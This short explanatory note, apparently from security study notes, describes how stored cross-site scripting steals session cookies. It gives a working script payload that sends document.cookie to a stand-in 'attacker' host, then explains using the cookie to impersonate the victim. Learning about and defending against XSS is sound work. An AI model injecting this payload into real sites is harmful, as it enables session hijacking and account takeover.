# Stored XXS

```
Stored XSS can be used to steal a victims cookie (data on a machine that authenticates a user to a webserver). This can be done by having a victims browser parse the following Javascript code:

<script>window.location='http://attacker/?cookie='+document.cookie</script>

This script navigates the users browser to a different URL, this new request will includes a victims cookie as a query parameter. When the attacker has acquired the cookie, they can use it to impersonate the victim.
